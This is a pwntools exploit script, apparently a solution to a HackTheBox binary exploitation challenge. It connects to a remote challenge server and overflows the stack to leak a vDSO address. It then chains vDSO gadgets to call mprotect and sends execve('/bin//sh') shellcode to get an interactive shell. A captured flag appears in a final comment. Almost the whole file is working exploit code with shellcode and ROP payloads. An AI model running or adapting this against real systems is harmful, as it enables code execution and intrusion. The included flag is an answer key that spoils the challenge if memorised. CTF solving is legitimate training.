from pwn import *

exe = context.binary = ELF('./challenge')

host = args.HOST or '178.62.122.9'
port = int(args.PORT or 31152)
'''
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 5555)
# '''

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
break *0x401005
break *0x401018
continue
'''.format(**locals())

io = start()
io.readuntil(b'Welcome!\n')


#print('-- leak --')
#io.sendline()
#leak = io.recvn(0x80)
#stack = u64(leak[104:][:8])
#print('stack: ' + p64(stack).hex())


print('-- bigwrite --')
size = 0x200
pl2 = cyclic(cyclic_find(b'iaaa'))
pl2 += p64(0x401020) # 1. ret 2 write
pl2 += p64(0x401058) # 2. ret 2 add rsp, 0x30 ; ret
pl2 += p64(size)     # len (write)
pl2 += p64(1)
pl2 += p64(2)
pl2 += p64(3)
pl2 += p64(4)
pl2 += p64(5)
pl2 += p64(0x401005) # 1. ret 2 read
pl2 += p64(0x401058)
pl2 += p64(size)     # len (read)
pl2 += b'Z'* (0x80 - len(pl2))
io.send(pl2)
io.recvn(0x80)

leak = io.recvn(size)
vdso = u64(leak[0xE0:][:8])  # local
vdso = u64(leak[0x90:][:8]) # qemu / remote
print('vdso: ' + p64(vdso).hex())

'''
print('-- bigread --')
vdso_size = 0x2000 # qemu / remote
#vdso_size = 0x1000 # local
#pl2 = cyclic(size)
pl2 = cyclic(cyclic_find(b'baab'))
pl2 += p64(0x40101b)  # 1. ret 2 write
pl2 += p64(0x401005)  # 2. ret 2 read
pl2 += p64(vdso_size) # len (write)
pl2 += p64(vdso)      #
pl2 += b'Z'* (size - len(pl2))
io.send(pl2)

vdso_dump = io.recvn(vdso_size)
#write('local_vdso.bin', vdso_dump)
#write('local_qemu_vdso.bin', vdso_dump)
#write('remote_vdso.bin', vdso_dump)
write('dump.bin', vdso_dump)
'''


# info proc mapping
# restore remote_vdso.bin binary 0x7fffe18f6000 0 0x1000

sh = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"


print('-- rop --')

# 0ba0 : pop rdx ; pop rax ; ret
# 08c6 : pop rbx ; pop r12 ; pop rbp ; ret
# 08e3 : mov rdi, rbx ; mov rsi, r12 ; syscall

#pl2 = cyclic(size)
pl2 += cyclic(cyclic_find(b'iaaa'))
pl2 += p64(vdso + 0x0ba0) # 1. ret 2 vdso
pl2 += p64(7) # rdx prot_rwx
pl2 += p64(10) # rax 10 mprotect
pl2 += p64(vdso + 0x08c6)
# 0x7fffe3ab18a8 - 0x7fffe3ab1b87
pl2 += p64(0x402000) # rbx -> rdi addr (rodata/secfilter)
pl2 += p64(0x1000) # r12 / rsi
pl2 += p64(0) # rbp
pl2 += p64(vdso + 0x08e3)
pl2 += p64(1)
pl2 += p64(2)
pl2 += p64(3)
pl2 += p64(4)
pl2 += p64(5)
pl2 += p64(0x401000) # read
pl2 += p64(0x402000) # ret
pl2 += p64(len(sh))  # read len
pl2 += p64(0x402000) # buffer
pl2 += cyclic((size - len(pl2)))
io.send(pl2)

io.send(sh)

io.interactive()
#flag = HTB{th4re_is_a1ways_a_vDS0_2_go_2!!}
